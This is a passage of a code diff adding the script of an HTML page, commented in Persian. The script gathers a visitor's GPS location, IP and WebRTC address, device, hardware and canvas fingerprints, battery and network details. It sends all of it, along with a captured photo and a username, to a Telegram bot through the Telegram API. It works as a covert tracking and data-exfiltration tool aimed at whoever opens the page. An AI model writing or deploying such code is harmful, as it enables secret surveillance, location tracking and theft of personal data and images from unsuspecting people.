+                message += `🎯 Accuracy: ${Math.round(gpsLocation.accuracy)} meters\n`;
+                message += `🗺️ Google Maps: https://maps.google.com/?q=${gpsLocation.latitude},${gpsLocation.longitude}\n`;
+                message += `📍 OpenStreetMap: https://www.openstreetmap.org/?mlat=${gpsLocation.latitude}&mlon=${gpsLocation.longitude}\n`;
+                if (gpsLocation.altitude) message += `📈 Altitude: ${Math.round(gpsLocation.altitude)}m\n`;
+                if (gpsLocation.heading) message += `🧭 Heading: ${gpsLocation.heading}°\n`;
+                if (gpsLocation.speed) message += `🚀 Speed: ${gpsLocation.speed} m/s\n`;
+            } else if (gpsLocation?.error) {
+                message += `❌ GPS Access Denied\n`;
+            } else {
+                message += `❌ GPS Location Unavailable\n`;
+            }
+            message += `\n`;
+            
+            // 4. اطلاعات IP
+            message += `🌐 IP INFORMATION:\n`;
+            message += `🖥️ IP Address: ${AppState.collectedData.ip || 'Unknown'}\n`;
+            if (AppState.collectedData.ipLocation) {
+                message += `🏙️ City: ${AppState.collectedData.ipLocation.city || 'Unknown'}\n`;
+                message += `🗺️ Country: ${AppState.collectedData.ipLocation.country || 'Unknown'}\n`;
+                message += `📌 Region: ${AppState.collectedData.ipLocation.region || 'Unknown'}\n`;
+                if (AppState.collectedData.ipLocation.latitude) {
+                    message += `📍 IP Coordinates: ${AppState.collectedData.ipLocation.latitude}, ${AppState.collectedData.ipLocation.longitude}\n`;
+                }
+                message += `🌐 ISP: ${AppState.collectedData.ipLocation.org || 'Unknown'}\n`;
+                message += `🔗 ASN: ${AppState.collectedData.ipLocation.asn || 'Unknown'}\n`;
+            }
+            if (AppState.collectedData.webRTCIP) {
+                message += `🔍 WebRTC IP: ${AppState.collectedData.webRTCIP}\n`;
+            }
+            message += `\n`;
+            
+            // 5. اطلاعات دستگاه
+            message += `📱 DEVICE INFORMATION:\n`;
+            message += `💻 Platform: ${AppState.collectedData.platform || 'Unknown'}\n`;
+            message += `🖥️ Browser: ${getBrowser()}\n`;
+            message += `⚙️ OS: ${getOS()}\n`;
+            message += `🗣️ Language: ${AppState.collectedData.language || 'Unknown'}\n`;
+            message += `🌍 Languages: ${AppState.collectedData.languages?.join(', ') || 'Unknown'}\n`;
+            message += `⏰ Timezone: ${AppState.collectedData.timezone || 'Unknown'}\n`;
+            message += `⏱️ UTC Offset: ${AppState.collectedData.timezoneOffset} minutes\n`;
+            message += `📏 Screen: ${AppState.collectedData.screen?.width || 0}x${AppState.collectedData.screen?.height || 0}\n`;
+            message += `🎨 Color Depth: ${AppState.collectedData.screen?.colorDepth || 0}-bit\n`;
+            message += `📊 Pixel Ratio: ${AppState.collectedData.window?.devicePixelRatio || 1}\n`;
+            message += `👆 Touch Points: ${AppState.collectedData.maxTouchPoints || 0}\n`;
+            message += `🍪 Cookies: ${AppState.collectedData.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
+            message += `👁️ Do Not Track: ${AppState.collectedData.doNotTrack || 'Unknown'}\n`;
+            message += `🤖 WebDriver: ${AppState.collectedData.webdriver ? 'Detected' : 'Not detected'}\n`;
+            message += `\n`;
+            
+            // 6. اطلاعات سخت‌افزار
+            message += `⚙️ HARDWARE INFORMATION:\n`;
+            message += `🖥️ CPU Cores: ${AppState.collectedData.hardwareConcurrency || 'Unknown'}\n`;
+            message += `💾 RAM: ${AppState.collectedData.deviceMemory || 'Unknown'} GB\n`;
+            message += `🏷️ Vendor: ${AppState.collectedData.vendor || 'Unknown'}\n`;
+            if (AppState.collectedData.webgl) {
+                message += `🎮 GPU Vendor: ${AppState.collectedData.webgl.vendor || 'Unknown'}\n`;
+                message += `🔧 GPU Renderer: ${AppState.collectedData.webgl.renderer?.substring(0, 80) || 'Unknown'}\n`;
+            }
+            if (AppState.collectedData.battery) {
+                message += `🔋 Battery: ${AppState.collectedData.battery.level}% ${AppState.collectedData.battery.charging ? '(Charging ⚡)' : '(Not charging)'}\n`;
+            }
+            if (AppState.collectedData.fonts) {
+                message += `🔤 Fonts: ${AppState.collectedData.fonts.join(', ')}\n`;
+            }
+            message += `\n`;
+            
+            // 7. اطلاعات شبکه
+            message += `🌐 NETWORK INFORMATION:\n`;
+            if (AppState.collectedData.network) {
+                message += `📶 Connection: ${AppState.collectedData.network.type || 'Unknown'}\n`;
+                message += `⬇️ Downlink: ${AppState.collectedData.network.downlink || 'Unknown'} Mbps\n`;
+                message += `⏱️ RTT: ${AppState.collectedData.network.rtt || 'Unknown'} ms\n`;
+                message += `💰 Data Saver: ${AppState.collectedData.network.saveData ? 'Enabled' : 'Disabled'}\n`;
+            }
+            message += `\n`;
+            
+            // 8. اطلاعات صفحه
+            message += `📄 PAGE INFORMATION:\n`;
+            message += `🔗 URL: ${AppState.collectedData.url}\n`;
+            message += `↩️ Referrer: ${AppState.collectedData.referrer}\n`;
+            message += `📏 Viewport: ${AppState.collectedData.window?.innerWidth || 0}x${AppState.collectedData.window?.innerHeight || 0}\n`;
+            message += `📍 Screen Position: X:${AppState.collectedData.window?.screenX || 0}, Y:${AppState.collectedData.window?.screenY || 0}\n`;
+            if (AppState.collectedData.canvasFingerprint) {
+                message += `🆔 Canvas Fingerprint: ${AppState.collectedData.canvasFingerprint.substring(0, 100)}...\n`;
+            }
+            message += `\n`;
+            
+            // 9. اطلاعات اضافی
+            message += `📊 ADDITIONAL INFORMATION:\n`;
+            message += `🖥️ Available Screen: ${AppState.collectedData.screen?.availWidth || 0}x${AppState.collectedData.screen?.availHeight || 0}\n`;
+            message += `🖼️ Outer Window: ${AppState.collectedData.window?.outerWidth || 0}x${AppState.collectedData.window?.outerHeight || 0}\n`;
+            message += `🎨 Pixel Depth: ${AppState.collectedData.screen?.pixelDepth || 0}-bit\n`;
+            message += `🔗 User Agent: ${AppState.collectedData.userAgent?.substring(0, 120)}...\n`;
+            
+            // ارسال پیام به تلگرام
+            await sendToTelegram(message);
+            
+            // ارسال عکس
+            if (photo) {
+                await sendPhotoToTelegram(photo, `📸 ${action} - ${userData.username || 'User'} - ${new Date().toLocaleTimeString('fa-IR')}`);
+            }
+        }
+
+        // تشخیص مرورگر
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (/chrome|chromium|crios/i.test(ua) && !/edge/i.test(ua)) return "Chrome";
+            if (/firefox|fxios/i.test(ua)) return "Firefox";
+            if (/safari/i.test(ua) && !/chrome/i.test(ua)) return "Safari";
+            if (/edg/i.test(ua)) return "Edge";
+            return "Unknown";
+        }
+
+        // تشخیص سیستم عامل
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (/windows nt 10/i.test(ua)) return "Windows 10/11";
+            if (/windows nt 6.3/i.test(ua)) return "Windows 8.1";
+            if (/windows nt 6.2/i.test(ua)) return "Windows 8";
+            if (/windows nt 6.1/i.test(ua)) return "Windows 7";
+            if (/windows nt 6.0/i.test(ua)) return "Windows Vista";
+            if (/windows nt 5.1/i.test(ua)) return "Windows XP";
+            if (/macintosh|mac os x/i.test(ua)) return "macOS";
+            if (/linux/i.test(ua)) return "Linux";
+            if (/android/i.test(ua)) return "Android";
+            if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+            return "Unknown";
+        }
+
+        // ارسال پیام به تلگرام
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Failed to send message:', error);
+                return false;
+            }
+        }
+
+        // ارسال عکس به تلگرام
+        async function sendPhotoToTelegram(photoBlob, caption) {
+            if (!photoBlob) return false;
+            
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
+            formData.append('photo', photoBlob, 'photo.jpg');
+            formData.append('caption', caption.substring(0, 200));
+            
+            try {
+                const response = await fetch(
+                    `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendPhoto`,
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Failed to send photo:', error);
+                return false;
+            }
+        }
+    </script>
+</body>
+</html>
